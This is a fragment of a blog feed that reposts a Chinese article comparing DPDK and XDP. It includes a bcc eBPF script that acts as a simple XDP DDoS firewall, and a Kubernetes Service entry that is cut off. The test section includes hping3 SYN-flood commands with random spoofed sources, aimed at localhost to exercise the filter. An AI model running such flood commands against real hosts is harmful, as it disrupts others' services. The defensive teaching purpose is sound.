      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DPDK与XDP</title>
    <link href="/2022/11/04/DPDK%E4%B8%8EXDP/"/>
    <url>/2022/11/04/DPDK%E4%B8%8EXDP/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># DPDK and XDP<blockquote><p>装载自腾讯云，原文链接：<a href="https://cloud.tencent.com/developer/article/1484793">https://cloud.tencent.com/developer/article/1484793</a></p></blockquote><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="tcp-x2F-ip"><a href="#tcp-x2F-ip" class="headerlink" title="tcp&#x2F;ip"></a>tcp&#x2F;ip</h2><h3 id="TCP-x2F-IP网络模型"><a href="#TCP-x2F-IP网络模型" class="headerlink" title="TCP&#x2F;IP网络模型"></a>TCP&#x2F;IP网络模型</h3><ul><li>链路层：负责封装和解封装IP报文，发送和接受ARP&#x2F;RARP报文等。</li><li>网络层：负责路由以及把分组报文发送给目标网络或主机。</li><li>传输层：负责对报文进行分组和重组，并以TCP或UDP协议格式封装报文。</li><li>应用层：负责向用户提供应用程序，比如HTTP、FTP、Telnet、DNS、SMTP等。</li></ul><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p><img src="https://ask.qcloudimg.com/http-save/1319879/w8h4cbei2s.png?imageView2/2/w/1620" alt="img"></p><h2 id="iptables-x2F-netfilter"><a href="#iptables-x2F-netfilter" class="headerlink" title="iptables&#x2F;netfilter"></a>iptables&#x2F;netfilter</h2><p>iptables是一个配置Linux内核防火墙的<a href="https://cloud.tencent.com/product/cli?from=3346">命令行工具</a>，它基于内核的netfilter机制。新版本的内核（3.13+）也提供了nftables，用于取代iptables</p><p><img src="https://ask.qcloudimg.com/http-save/1319879/kcj3j4dupy.png?imageView2/2/w/1620" alt="img"></p><h2 id="iptables的问题和改进方案"><a href="#iptables的问题和改进方案" class="headerlink" title="iptables的问题和改进方案"></a>iptables的问题和改进方案</h2><p>iptables规则逐渐增加，遍历iptables效率变得很低，一个表现就是kube-proxy，他是Kubernetes的一个组件，<a href="https://cloud.tencent.com/product/tke?from=3346">容器</a>要使用iptables和-j DNAT规则为服务提供<a href="https://cloud.tencent.com/product/clb?from=3346">负载均衡</a>。随着服务增加，iptable的规则列表指数增长。随着服务数量的增长，网络延迟和性能严重下降。iptables的还有一个缺点，无法实现增量更新。每次添加新规则时，必须更新整个规则列表。一个例子：装配2万个Kubernetes服务产生16万条的iptables规则需要耗时5个小时。</p><p>在容器环境下还有一个问题：容器的生命周期可能很多，可能一个容器的生命周期只有几秒，意味着iptables规则需要被快速更新，这也使得依靠使用IP地址进行安全过滤的系统受到压力，因为集群中的所有节点都必须始终知道最新的IP到容器的映射。</p><p>一个解决方案是BPF，<a href="https://github.com/cilium/cilium">Cilium</a>项目就利用了这种技术.</p><p><img src="https://ask.qcloudimg.com/http-save/1319879/dhj7kcmvcr.png?imageView2/2/w/1620" alt="img"></p><p>利用BPF构建的bpfilter性能远高于iptables和nftables, linux内核社区的Florian Westphal提出了一个运行在bpfilter上框架，通过框架并将nftables转换为BPF。框架允许保持特定领域nftables语句，而且还可以带有JIT编译器，硬件卸载和工具集等BPF运行时的所有优点。</p><h2 id="linux网络为什么慢"><a href="#linux网络为什么慢" class="headerlink" title="linux网络为什么慢"></a>linux网络为什么慢</h2><p>linux协议栈是在20世纪90年代作为一个通用操作系统实现的，想要支持现代的高速网络，必须要做优化.</p><p><a href="https://blog.csdn.net/dog250">dog250</a> 把linux协议栈重新”分层”, 指出了其中的”门”, 即那些会严重影响性能的门槛</p><p><img src="https://ask.qcloudimg.com/http-save/1319879/cnz7nsptwu.png?imageView2/2/w/1620" alt="img"></p><p>目前有两个比较火的方案：DPDK和XDP，两种方案分别在用户层和内核层直接处理数据包，避免了用户、内核态切换k开销。</p><h1 id="DPDK"><a href="#DPDK" class="headerlink" title="DPDK"></a>DPDK</h1><p>DPDK由intel支持，DPDK的加速方案原理是完全绕开内核实现的协议栈，把数据包直接从网卡拉到用户态，依靠Intel自身处理器的一些专门优化，来高速处理数据包。</p><p>Intel DPDK全称Intel Data Plane Development Kit，是intel提供的数据平面开发工具集，为Intel architecture（IA）处理器架构下用户空间高效的数据包处理提供库函数和驱动的支持，它不同于Linux系统以通用性设计为目的，而是专注于网络应用中数据包的高性能处理。DPDK应用程序是运行在用户空间上利用自身提供的数据平面库来收发数据包，绕过了Linux内核协议栈对数据包处理过程。Linux内核将DPDK应用程序看作是一个普通的用户态进程，包括它的编译、连接和加载方式和普通程序没有什么两样。DPDK程序启动后只能有一个主线程，然后创建一些子线程并绑定到指定CPU核心上运行。</p><p><img src="https://ask.qcloudimg.com/http-save/1319879/uw20zpb9p1.png?imageView2/2/w/1620" alt="img"></p><h1 id="XDP"><a href="#XDP" class="headerlink" title="XDP"></a>XDP</h1><h2 id="eBPF"><a href="#eBPF" class="headerlink" title="eBPF"></a>eBPF</h2><p>eBPF（extended Berkeley Packet Filter）起源于BPF，它提供了内核的数据包过滤机制。</p><ul><li>BPF is a highly flexible and efficient virtual machine-like construct in the Linux kernel allowing to execute bytecode at various hook points in a safe manner. It is used in a number of Linux kernel subsystems, most prominently networking, tracing and security (e.g. sandboxing).</li><li>BPF的最原始版本为cBPF，曾用于tcpdump</li><li>Berkeley Packet Filter 尽管名字的也表明最初是设计用于packet filtering，但是现在已经远不止networking上面的用途了.</li></ul><p><img src="https://ask.qcloudimg.com/http-save/1319879/vxsewsqpf0.png?imageView2/2/w/1620" alt="img"></p><p>基于bpf 这个<a href="https://github.com/iovisor/bcc">项目</a>  开发了很多有用的小工具, 具体如下图</p><p><img src="https://ask.qcloudimg.com/http-save/1319879/67xpxaoubn.png?imageView2/2/w/1620" alt="img"></p><p>更多关于bpf的历史和设计、概念可以参考<a href="https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html">这篇文章</a></p><h2 id="XDP-1"><a href="#XDP-1" class="headerlink" title="XDP"></a>XDP</h2><p>XDP的意思是eXpress Data Path，它能够在网络包进入用户态直接对网络包进行过滤或者处理。XDP依赖eBPF技术。</p><p><img src="https://ask.qcloudimg.com/http-save/1319879/gun42kp75l.png?imageView2/2/w/1620" alt="img"></p><p><img src="https://ask.qcloudimg.com/http-save/1319879/konghu5766.png?imageView2/2/w/1620" alt="img"></p><p>相对于DPDK，XDP具有以下优点</p><ul><li>无需第三方代码库和许可</li><li>同时支持轮询式和中断式网络</li><li>无需分配大页</li><li>无需专用的CPU</li><li>无需定义新的安全网络模型</li></ul><p>XDP的使用场景包括</p><ul><li>DDoS防御</li><li>防火墙</li><li>基于XDP_TX的负载均衡</li><li>网络统计</li><li>复杂网络采样</li><li>高速交易平台</li></ul><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>这个例子使用bcc，参考 <a href="https://github.com/iovisor/bcc/blob/master/examples/networking/xdp/xdp_drop_count.py">这个例子</a> 和 <a href="https://github.com/iovisor/bcc/blob/master/examples/networking/xdp/xdp_drop_count.py">这个例子</a>改造而成</p><p>这个例子中，实现一个简单的ddos防火墙，当包很小，两个包的时间距离很小的时候，认为这是一个ddos攻击，直接丢包，否则让其通过。（这是一个极度的简化例子，真实的ddos防御工具要复杂得多）</p><blockquote><p>注意需要在内核4.6以上系统测试，笔者使用ubuntu 18.04</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs js">#!<span class="hljs-regexp">/usr/</span>bin/python<br>#<br># xdp_drop_count.<span class="hljs-property">py</span> <span class="hljs-title class_">Drop</span> incoming packets on <span class="hljs-variable constant_">XDP</span> layer and count <span class="hljs-keyword">for</span> which<br>#                   protocol type<br>#<br># <span class="hljs-title class_">Copyright</span> (c) <span class="hljs-number">2016</span> <span class="hljs-title class_">PLUMgrid</span><br># <span class="hljs-title class_">Copyright</span> (c) <span class="hljs-number">2016</span> <span class="hljs-title class_">Jan</span> <span class="hljs-title class_">Ruth</span><br># <span class="hljs-title class_">Licensed</span> under the <span class="hljs-title class_">Apache</span> <span class="hljs-title class_">License</span>, <span class="hljs-title class_">Version</span> <span class="hljs-number">2.0</span> (the <span class="hljs-string">&quot;License&quot;</span>)<br><br><span class="hljs-keyword">from</span> bcc <span class="hljs-keyword">import</span> <span class="hljs-variable constant_">BPF</span><br><span class="hljs-keyword">import</span> pyroute2<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>flags = <span class="hljs-number">0</span><br>def <span class="hljs-title function_">usage</span>():<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Usage: &#123;0&#125; [-S] &lt;ifdev&gt;&quot;</span>.<span class="hljs-title function_">format</span>(sys.<span class="hljs-property">argv</span>[<span class="hljs-number">0</span>]))<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;       -S: use skb mode\n&quot;</span>)<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;e.g.: &#123;0&#125; eth0\n&quot;</span>.<span class="hljs-title function_">format</span>(sys.<span class="hljs-property">argv</span>[<span class="hljs-number">0</span>]))<br>    <span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span>(sys.<span class="hljs-property">argv</span>) &lt; <span class="hljs-number">2</span> or <span class="hljs-title function_">len</span>(sys.<span class="hljs-property">argv</span>) &gt; <span class="hljs-number">3</span>:<br>    <span class="hljs-title function_">usage</span>()<br><br><span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span>(sys.<span class="hljs-property">argv</span>) == <span class="hljs-number">2</span>:<br>    device = sys.<span class="hljs-property">argv</span>[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span>(sys.<span class="hljs-property">argv</span>) == <span class="hljs-number">3</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-S&quot;</span> <span class="hljs-keyword">in</span> sys.<span class="hljs-property">argv</span>:<br>        # <span class="hljs-variable constant_">XDP_FLAGS_SKB_MODE</span><br>        flags |= <span class="hljs-number">2</span> &lt;&lt; <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-S&quot;</span> == sys.<span class="hljs-property">argv</span>[<span class="hljs-number">1</span>]:<br>        device = sys.<span class="hljs-property">argv</span>[<span class="hljs-number">2</span>]<br>    <span class="hljs-attr">else</span>:<br>        device = sys.<span class="hljs-property">argv</span>[<span class="hljs-number">1</span>]<br><br>mode = <span class="hljs-variable constant_">BPF</span>.<span class="hljs-property">XDP</span><br>ctxtype = <span class="hljs-string">&quot;xdp_md&quot;</span><br><br># load <span class="hljs-variable constant_">BPF</span> program<br>b = <span class="hljs-title function_">BPF</span>(text = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#define KBUILD_MODNAME &quot;</span>foo<span class="hljs-string">&quot;</span><br><span class="hljs-string">#include &lt;uapi/linux/bpf.h&gt;</span><br><span class="hljs-string">#include &lt;linux/in.h&gt;</span><br><span class="hljs-string">#include &lt;linux/if_ether.h&gt;</span><br><span class="hljs-string">#include &lt;linux/if_packet.h&gt;</span><br><span class="hljs-string">#include &lt;linux/if_vlan.h&gt;</span><br><span class="hljs-string">#include &lt;linux/ip.h&gt;</span><br><span class="hljs-string">#include &lt;linux/ipv6.h&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">// how to determin ddos</span><br><span class="hljs-string">#define MAX_NB_PACKETS 1000</span><br><span class="hljs-string">#define LEGAL_DIFF_TIMESTAMP_PACKETS 1000000</span><br><span class="hljs-string"></span><br><span class="hljs-string">// store data, data can be accessd in kernel and user namespace</span><br><span class="hljs-string">BPF_HASH(rcv_packets);</span><br><span class="hljs-string">BPF_TABLE(&quot;</span>percpu_array<span class="hljs-string">&quot;, uint32_t, long, dropcnt, 256);</span><br><span class="hljs-string"></span><br><span class="hljs-string">static inline int parse_ipv4(void *data, u64 nh_off, void *data_end) &#123;</span><br><span class="hljs-string">    struct iphdr *iph = data + nh_off;</span><br><span class="hljs-string">    if ((void*)&amp;iph[1] &gt; data_end)</span><br><span class="hljs-string">        return 0;</span><br><span class="hljs-string">    return iph-&gt;protocol;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">static inline int parse_ipv6(void *data, u64 nh_off, void *data_end) &#123;</span><br><span class="hljs-string">    struct ipv6hdr *ip6h = data + nh_off;</span><br><span class="hljs-string">    if ((void*)&amp;ip6h[1] &gt; data_end)</span><br><span class="hljs-string">        return 0;</span><br><span class="hljs-string">    return ip6h-&gt;nexthdr;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">// determine ddos</span><br><span class="hljs-string">static inline int detect_ddos()&#123;</span><br><span class="hljs-string">    // Used to count number of received packets</span><br><span class="hljs-string">    u64 rcv_packets_nb_index = 0, rcv_packets_nb_inter=1, *rcv_packets_nb_ptr;</span><br><span class="hljs-string">    // Used to measure elapsed time between 2 successive received packets</span><br><span class="hljs-string">    u64 rcv_packets_ts_index = 1, rcv_packets_ts_inter=0, *rcv_packets_ts_ptr;</span><br><span class="hljs-string">    int ret = 0;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    rcv_packets_nb_ptr = rcv_packets.lookup(&amp;rcv_packets_nb_index);</span><br><span class="hljs-string">    rcv_packets_ts_ptr = rcv_packets.lookup(&amp;rcv_packets_ts_index);</span><br><span class="hljs-string">    if(rcv_packets_nb_ptr != 0 &amp;&amp; rcv_packets_ts_ptr != 0)&#123;</span><br><span class="hljs-string">        rcv_packets_nb_inter = *rcv_packets_nb_ptr;</span><br><span class="hljs-string">        rcv_packets_ts_inter = bpf_ktime_get_ns() - *rcv_packets_ts_ptr;</span><br><span class="hljs-string">        if(rcv_packets_ts_inter &lt; LEGAL_DIFF_TIMESTAMP_PACKETS)&#123;</span><br><span class="hljs-string">            rcv_packets_nb_inter++;</span><br><span class="hljs-string">        &#125; else &#123;</span><br><span class="hljs-string">            rcv_packets_nb_inter = 0;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        if(rcv_packets_nb_inter &gt; MAX_NB_PACKETS)&#123;</span><br><span class="hljs-string">            ret = 1;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    rcv_packets_ts_inter = bpf_ktime_get_ns();</span><br><span class="hljs-string">    rcv_packets.update(&amp;rcv_packets_nb_index, &amp;rcv_packets_nb_inter);</span><br><span class="hljs-string">    rcv_packets.update(&amp;rcv_packets_ts_index, &amp;rcv_packets_ts_inter);</span><br><span class="hljs-string">    return ret;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">// determine and recode by proto</span><br><span class="hljs-string">int xdp_prog1(struct CTXTYPE *ctx) &#123;</span><br><span class="hljs-string">    void* data_end = (void*)(long)ctx-&gt;data_end;</span><br><span class="hljs-string">    void* data = (void*)(long)ctx-&gt;data;</span><br><span class="hljs-string">    struct ethhdr *eth = data;</span><br><span class="hljs-string">    // drop packets</span><br><span class="hljs-string">    int rc = XDP_PASS; // let pass XDP_PASS or redirect to tx via XDP_TX</span><br><span class="hljs-string">    long *value;</span><br><span class="hljs-string">    uint16_t h_proto;</span><br><span class="hljs-string">    uint64_t nh_off = 0;</span><br><span class="hljs-string">    uint32_t index;</span><br><span class="hljs-string">    nh_off = sizeof(*eth);</span><br><span class="hljs-string">    if (data + nh_off  &gt; data_end)</span><br><span class="hljs-string">        return rc;</span><br><span class="hljs-string">    h_proto = eth-&gt;h_proto;</span><br><span class="hljs-string">    // parse double vlans</span><br><span class="hljs-string">    if (detect_ddos() == 0)&#123;</span><br><span class="hljs-string">        return rc;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    rc = XDP_DROP;</span><br><span class="hljs-string">    #pragma unroll</span><br><span class="hljs-string">    for (int i=0; i&lt;2; i++) &#123;</span><br><span class="hljs-string">        if (h_proto == htons(ETH_P_8021Q) || h_proto == htons(ETH_P_8021AD)) &#123;</span><br><span class="hljs-string">            struct vlan_hdr *vhdr;</span><br><span class="hljs-string">            vhdr = data + nh_off;</span><br><span class="hljs-string">            nh_off += sizeof(struct vlan_hdr);</span><br><span class="hljs-string">            if (data + nh_off &gt; data_end)</span><br><span class="hljs-string">                return rc;</span><br><span class="hljs-string">                h_proto = vhdr-&gt;h_vlan_encapsulated_proto;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if (h_proto == htons(ETH_P_IP))</span><br><span class="hljs-string">        index = parse_ipv4(data, nh_off, data_end);</span><br><span class="hljs-string">    else if (h_proto == htons(ETH_P_IPV6))</span><br><span class="hljs-string">       index = parse_ipv6(data, nh_off, data_end);</span><br><span class="hljs-string">    else</span><br><span class="hljs-string">        index = 0;</span><br><span class="hljs-string">    value = dropcnt.lookup(&amp;index);</span><br><span class="hljs-string">    if (value)</span><br><span class="hljs-string">        *value += 1;</span><br><span class="hljs-string">    return rc;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>, cflags=[<span class="hljs-string">&quot;-w&quot;</span>, <span class="hljs-string">&quot;-DCTXTYPE=%s&quot;</span> % ctxtype])<br><br>fn = b.<span class="hljs-title function_">load_func</span>(<span class="hljs-string">&quot;xdp_prog1&quot;</span>, mode)<br>b.<span class="hljs-title function_">attach_xdp</span>(device, fn, flags)<br><br><br>dropcnt = b.<span class="hljs-title function_">get_table</span>(<span class="hljs-string">&quot;dropcnt&quot;</span>)<br>prev = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Printing drops per IP protocol-number, hit CTRL+C to stop&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-attr">try</span>:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dropcnt.<span class="hljs-title function_">keys</span>():<br>            val = dropcnt.<span class="hljs-title function_">sum</span>(k).<span class="hljs-property">value</span><br>            i = k.<span class="hljs-property">value</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-attr">val</span>:<br>                delta = val - prev[i]<br>                prev[i] = val<br>                <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;&#123;&#125;: &#123;&#125; pkt/s&quot;</span>.<span class="hljs-title function_">format</span>(i, delta))<br>        time.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>)<br>    except <span class="hljs-title class_">KeyboardInterrupt</span>:<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Removing filter from device&quot;</span>)<br>        <span class="hljs-keyword">break</span>;<br><br>b.<span class="hljs-title function_">remove_xdp</span>(device, flags)<br></code></pre></td></tr></table></figure><p>运行命令, 测试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"># 运行 ddos_firewall<br>/usr/local/share/bcc/examples/networking/xdp/ddos_firewall.<span class="hljs-property">py</span> -S lo<br><br># 在另一个窗口用ab测试；本地<span class="hljs-number">80</span>有一个正在运行的nginx<br>ab -n <span class="hljs-number">1000</span> -c <span class="hljs-number">10</span> <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span><br><br># 发现有部分请求被判定成了ddos, 平均耗时<span class="hljs-number">3.</span>3ms (不开防火墙耗时约1ms)<br><span class="hljs-number">6</span>: <span class="hljs-number">28</span> pkt/s<br><span class="hljs-number">6</span>: <span class="hljs-number">27</span> pkt/s<br><span class="hljs-number">6</span>: <span class="hljs-number">26</span> pkt/s<br><br># 使用hping3测试更准确<br># 使用 --fast测试正常，并无drop<br>hping3 -c <span class="hljs-number">10000</span> -d <span class="hljs-number">120</span> -S -w <span class="hljs-number">64</span> -p <span class="hljs-number">80</span> --fast --rand-source localhost<br><br># 使用 --faster测试，出现大量drop<br>hping3 -c <span class="hljs-number">10000</span> -d <span class="hljs-number">120</span> -S -w <span class="hljs-number">64</span> -p <span class="hljs-number">80</span> --faster --rand-source localhost<br></code></pre></td></tr></table></figure><p>参考:</p><ul><li><a href="https://tonydeng.github.io/sdn-handbook">https://tonydeng.github.io/sdn-handbook</a> </li><li><a href="https://blog.csdn.net/dog250/article/details/77993218">https://blog.csdn.net/dog250/article/details/77993218</a></li><li><a href="https://cilium.io/blog/2018/04/17/why-is-the-kernel-community-replacing-iptables/">https://cilium.io/blog/2018/04/17/why-is-the-kernel-community-replacing-iptables/</a></li><li><a href="https://kuaibao.qq.com/s/20180420A06HIB00?refer=spider">https://kuaibao.qq.com/s/20180420A06HIB00?refer=spider</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html">https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html</a></li><li><a href="https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2019/02/25/ebpf-introduction-1.html">https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2019/02/25/ebpf-introduction-1.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Service、DNS与服务发现</title>
    <link href="/2022/10/29/Service%E3%80%81DNS%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/"/>
    <url>/2022/10/29/Service%E3%80%81DNS%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                                Service、DNS与服务发现<blockquote><p>本文笔记来自：「深入剖析 Kubernetes课程」，原文链接：<a href="https://time.geekbang.org/column/article/64948">https://time.geekbang.org/column/article/64948</a></p></blockquote><p>Kubernetes之所以需要Service，一方面是因为Pod的IP不是固定的，另一方面则是因为一组Pod实例之间总会有负载均衡的需求。</p><p>一个最典型的Service定义，如下所示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hostnames</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hostnames</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">default</span><br>    <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9376</span><br><br></code></pre></td></tr></table></figure><p>这个Service的例子，相信你不会陌生。其中，我使用了selector字段来声明这个Service只代理携带了app&#x3D;hostnames标签的Pod。并且，这个Service的80端口，代理的是Pod的9376端口。</p><p>然后，应用的Deployment如下所示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hostnames</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hostnames</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hostnames</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hostnames</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/serve_hostname</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">9376</span><br>          <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br><br></code></pre></td></tr></table></figure><p>这个应用的作用，就是每次访问9376端口时，返回它自己的hostname。</p><p>而被selector选中的Pod，就称为Service的Endpoints，可以使用kubectl get ep命令看到它们，如下所示：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ kubectl get endpoints hostnames<br>NAME        ENDPOINTS<br>hostnames   <span 